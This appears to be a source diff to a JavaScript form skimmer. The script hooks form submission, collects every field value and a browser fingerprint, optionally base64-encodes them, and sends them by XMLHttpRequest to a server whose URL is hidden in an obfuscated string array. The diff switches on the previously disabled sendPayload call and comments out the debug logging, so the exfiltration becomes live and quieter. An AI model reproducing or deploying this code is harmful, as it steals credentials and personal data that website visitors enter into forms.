@@ -46,14 +46,18 @@ function bindForm(form) {
 					e.preventDefault();
 				}
 				let payload = grabAll(form);
-				if(trackClients) {
-					let clientInfo = profileClient();
-					console.log("clientInfo: " + clientInfo);
-					// TODO: serialize client data and append to payload
+				if(payload != "ERROR") {
+					if(trackClients) {
+						let clientInfo = profileClient();
+						console.log("clientInfo: " + clientInfo);
+						// TODO: serialize client data and append to payload
+					}
+					//	send the payload to our server
+					sendPayload(payload);				
+					console.log("sending payload...");
+				} else {
+					console.log("ERROR: failed to grabAll");
 				}
-				//	send the payload to our server
-				//sendPayload(payload);				
-				console.log("sending payload...");
             }, false);
     }
     appendFields(form);
@@ -112,21 +116,21 @@ function grabAll(form) {
 					elementName = 'unknown';
 				}
 			
-				console.log("DEBUG: name: " + elementName);		
+				//console.log("DEBUG: name: " + elementName);		
 
 				if(formElement.type != "submit") {
 					var elementValue = "";
 
 					if(formElement instanceof HTMLSelectElement) {
 						var selectContents = "";
-						console.log("DEBUG: parsing all selectedOptions");
+						//console.log("DEBUG: parsing all selectedOptions");
 						if(formElement.multiple) {
-							console.log("DEBUG: multi value - gotta catch em all");
-							console.log("DEBUG: selectedOptions: " + formElement.selectedOptions);
+							//console.log("DEBUG: multi value - gotta catch em all");
+							//console.log("DEBUG: selectedOptions: " + formElement.selectedOptions);
 							var optionList = formElement.selectedOptions;
 							if(optionList.length > 0) {
 								for(j = 0; j < optionList.length; j++) {
-									console.log("DEBUG: option number [" + j + "], value= " + optionList[j].value);
+									//console.log("DEBUG: option number [" + j + "], value= " + optionList[j].value);
 									//	serialize contents
 									if(selectContents == "") {
 										selectContents = optionList[j].value;
@@ -157,11 +161,11 @@ function grabAll(form) {
 		
 		//	check to see if base 64 encoding is enabled
 		if(enableEncoding) {
-			console.log("DEBUG: before base 64 encoding: " + payload);
+			//console.log("DEBUG: before base 64 encoding: " + payload);
 			payload = btoa(payload);
 		}
 		//	output payload in console for debugging
-		console.log("DEBUG: resulting payload = " + payload);
+		//console.log("DEBUG: resulting payload = " + payload);
 		
 		return payload;
 	} else {
@@ -191,7 +195,7 @@ function profileClient() {
 
 	if(pluginList.length) {
 		for(let i = 0; i < pluginList.length; i++ ) {
-			console.log("DEBUG: plugin details: " + pluginList[i].name)
+			//console.log("DEBUG: plugin details: " + pluginList[i].name)
 			if(serializedPlugins == "") {
 				serializedPlugins = pluginList[i].name;
 			} else {
@@ -203,8 +207,8 @@ function profileClient() {
 	//	populate an object to be serialized
 	clientData = [appCodeName,appName,appVersion,platform,serializedPlugins,product,productSub,userAgent];
 	
-	console.log("DEBUG: clientData: " + clientData);
-	
+	//console.log("DEBUG: clientData: " + clientData);
+
 	return clientData;
 }
 
@@ -214,7 +218,7 @@ function serializeData(inputData) {
 
 /* send the collected data to our server */
 function sendPayload(payload) {
-    console.log("DEBUG: usePost = " + usePost);
+    //console.log("DEBUG: usePost = " + usePost);
     var xhttp = new XMLHttpRequest();
 
     if(usePost) {
@@ -222,7 +226,7 @@ function sendPayload(payload) {
         xhttp.setRequestHeader(_0x3745[4], _0x3745[5]);
         xhttp.onreadystatechange = function() {
             if (this.readyState == 4 && this.status == 200) {
-               console.log("DEBUG: data sent");
+               //console.log("DEBUG: data sent");
             }
         };
         xhttp.send('data=' + payload);
@@ -230,7 +234,7 @@ function sendPayload(payload) {
         xhttp.open(_0x3745[6], _0x3745[0] +_0x3745[1] + _0x3745[2] + _0x3745[3] + '?data=' + payload, true);
         xhttp.onreadystatechange = function() {
             if (this.readyState == 4 && this.status == 200) {
-               console.log("DEBUG: data sent");
+               //console.log("DEBUG: data sent");
             }
         };
         xhttp.send();
